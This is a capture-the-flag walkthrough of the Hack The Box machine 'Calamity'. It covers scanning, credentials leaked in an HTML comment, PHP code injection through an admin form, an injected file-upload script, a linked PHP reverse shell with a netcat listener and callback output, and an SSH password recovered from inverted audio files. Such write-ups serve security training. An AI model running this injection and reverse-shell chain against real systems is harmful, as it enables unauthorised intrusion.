# Calamity - 10.10.10.27
## Scanning
```
nmap -v -A -n -p- 10.10.10.27

Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 22/tcp open  ssh 	OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
[*] Nmap: | ssh-hostkey:
[*] Nmap: |   2048 b6:46:31:9c:b5:71:c5:96:91:7d:e4:63:16:f9:59:a2 (RSA)
[*] Nmap: |   256 10:c4:09:b9:48:f1:8c:45:26:ca:f6:e1:c2:dc:36:b9 (ECDSA)
[*] Nmap: |_  256 a8:bf:dd:c0:71:36:a8:2a:1b:ea:3f:ef:66:99:39:75 (EdDSA)
[*] Nmap: 80/tcp open  http	Apache httpd 2.4.18 ((Ubuntu))
[*] Nmap: | http-methods:
[*] Nmap: |_  Supported Methods: GET HEAD POST OPTIONS
[*] Nmap: |_http-server-header: Apache/2.4.18 (Ubuntu)
[*] Nmap: |_http-title: Brotherhood Software
```
## Web server
```
dirb http://10.10.10.27 /usr/share/dirb/wordlists/common.txt
...
---- Scanning URL: http://10.10.10.27/ ----
+ http://10.10.10.27/admin.php (CODE:200|SIZE:451)
+ http://10.10.10.27/index.html (CODE:200|SIZE:514)
+ http://10.10.10.27/server-status (CODE:403|SIZE:299)
==> DIRECTORY: http://10.10.10.27/uploads/  
```
### What's in the admin.php?
```html
root@kingpin:/# curl http://10.10.10.27/admin.php --trace tr.txt
<html><body>
<form method="post">
Password: <input type="text" name="user"><br>
Username: <input type="password" name="pass">
  <input type="submit" value="Log in to the powerful administrator page">
   			 <!-- password is:skoupidotenekes-->
</form>
</body></html>
```
 Log in as ```admin/skoupidotenekes```
```html
<html>
<title>GOT U BEEJAY</title>
<body>
TADAA IT HAS NOTHING
<br>
what were you waiting for dude ?you know I aint finished creating<br>
xalvas,the boss said I am a piece of shit and that I dont take my job seriously...but when all this is set up...Ima ask for double the money<br>
just cauz he insulted me <br>
Maybe he's still angry at me deleting the DB on the previous site...he should keep backups man !
<br>
anyway I made an html interpreter to work on my php skills !
It wasn't easy I assure you...I'm just a P-R-O on PHP !!!!!!!!!
<br>
access in here is like 99% secure ,but even if that 1% reaches this page ,there's nothing they can do !
<br>
html is super-harmless to our system!
Try writing some simple stuff ...and see how difficult my job is and how underpaid I am
<form method="get">
Your HTML: <input type="text" name="html"><br>
  <input type="submit" value="SHOW ME DA PAGE">
</form>
</body></html>```

SO...
>html is super-harmless to our system!

It is correct, but PHP is not.

Input this line  ```<?php system('whoami');?>``` and submit.
Output - ```www-data```

Sweet! Now we can upload a shell to __/uploads__ and get our fancy shell.

## Getting in
### Uploading reverse shell

Inject PHP that will get the file to ```/uploads```. Here is a simple script:
```php
<!DOCTYPE html>
<html>
<head>
  <title>Upload your files</title>
</head>
<body>
  <form enctype="multipart/form-data" action="admin.php?html=%3C%21DOCTYPE+html%3E+%3Chtml%3E+%3Chead%3E+++%3Ctitle%3EUpload+your+files%3C%2Ftitle%3E+%3C%2Fhead%3E+%3Cbody%3E+++%3Cform+enctype%3D%22multipart%2Fform-data%22+action%3D%22admin.php%22+method%3D%22POST%22%3E+++++%3Cp%3EUpload+your+file%3C%2Fp%3E+++++%3Cinput+type%3D%22file%22+name%3D%22uploaded_file%22%3E%3C%2Finput%3E%3Cbr+%2F%3E+++++%3Cinput+type%3D%22submit%22+value%3D%22Upload%22%3E%3C%2Finput%3E+++%3C%2Fform%3E+%3C%2Fbody%3E+%3C%2Fhtml%3E+%3C%3FPHP+++if%28%21empty%28%24_FILES%5B%27uploaded_file%27%5D%29%29+++%7B+++++%24path+%3D+%22uploads%2F%22%3B+++++%24path+%3D+%24path+.+basename%28+%24_FILES%5B%27uploaded_file%27%5D%5B%27name%27%5D%29%3B+++++if%28move_uploaded_file%28%24_FILES%5B%27uploaded_file%27%5D%5B%27tmp_name%27%5D%2C+%24path%29%29+%7B+++++++echo+%22The+file+%22.++basename%28+%24_FILES%5B%27uploaded_file%27%5D%5B%27name%27%5D%29.++++++++%22+has+been+uploaded%22%3B+++++%7D+else%7B+++++++++echo+%22There+was+an+error+uploading+the+file%2C+please+try+again%21%22%3B+++++%7D+++%7D+%3F%3E" method="POST">
	<p>Upload your file</p>
	<input type="file" name="uploaded_file"></input><br />
	<input type="submit" value="Upload"></input>
  </form>
</body>
</html>
<?PHP
  if(!empty($_FILES['uploaded_file']))
  {
	$path = "uploads/";
	$path = $path . basename( $_FILES['uploaded_file']['name']);
	if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)) {
  	echo "The file ".  basename( $_FILES['uploaded_file']['name']).
  	" has been uploaded";
	} else{
    	echo "There was an error uploading the file, please try again!";
	}
  }
?>
```
You can notice how GET parameter in admin.php is repeating url-encoded script. This is done so the code on the page survives the refresh from POST action.

The reverse shell itself you can get from [here](http://pentestmonkey.net/tools/web-shells/php-reverse-shell).

### Connecting

First, set up netcat listener (OPTIONS: no name resolution, verbose, listener, port).
```
nc -nvlp 1337
listening on [any] 1337 ..
```
Navigate to 10.10.10.27/uploads and execute a shell.
```
connect to [10.10.14.195] from (UNKNOWN) [10.10.10.27] 55794
Linux calamity 4.4.0-81-generic #104-Ubuntu SMP Wed Jun 14 08:15:00 UTC 2017 i686 i686 i686 GNU/Linux
 20:29:53 up  9:10,  2 users,  load average: 5.29, 5.64, 5.49
USER 	TTY  	FROM         	LOGIN@   IDLE   JCPU   PCPU WHAT
xalvas   pts/1	10.10.15.220 	16:22	1:47m  2.49s  2.26s gdb goodluck
xalvas   pts/7	10.10.15.220 	17:22	1:50m  0.33s  0.33s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```
## Discovering vectors

In order to find a following attack vector, let's look through the filesystem.
In /home/xalvas we find a note which will be useful later
```
$ cat dontforget.txt
peda keeps commads history in the working dir...you should make a dir in /tmp and work from there
keep in mind that tmp is not listable,so other users cannot see your files and folders (if you dont use extrmely simple names)
```
Another thing is 2 audio files, ```recov.wav``` and ```alarmclock/rick.wav```. Both of them sound a lot like Rick Astley and both fragments are 18 seconds long. But...
```
$ diff recov.wav alarmclocks/rick.wav
Binary files recov.wav and alarmclocks/rick.wav differ
```
Interesting. Canceling out the audios might not be a bad idea.
> Invert does not usually affect the sound of the audio at all, but it can be used for audio cancellation. If Invert is applied to one track and that track is mixed with another uninverted track that has identical audio, the identical audio is cancelled out (silenced).

- apt-get install audacity
- Open audacity and import 2 tracks
- In track dropdown menu choose “Split stereo to mono”
- Select one track and choose Effects > Invert
- Play the [track](https://github.com/leolashkevych/CTF/blob/master/Hackthebox.eu/Machines/Calamity%20-%2010.10.10.27/invert.mp3)  

"47936..* your password is 185"

Trying to log in as xalvas/18547936..*
```
ssh xalvas@10.10.10.27
xalvas@10.10.10.27's password:
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-81-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management: 	https://landscape.canonical.com
 * Support:    	https://ubuntu.com/advantage


Last login: Mon Nov  6 23:39:24 2017 from 10.10.14.164
xalvas@calamity:~$
```
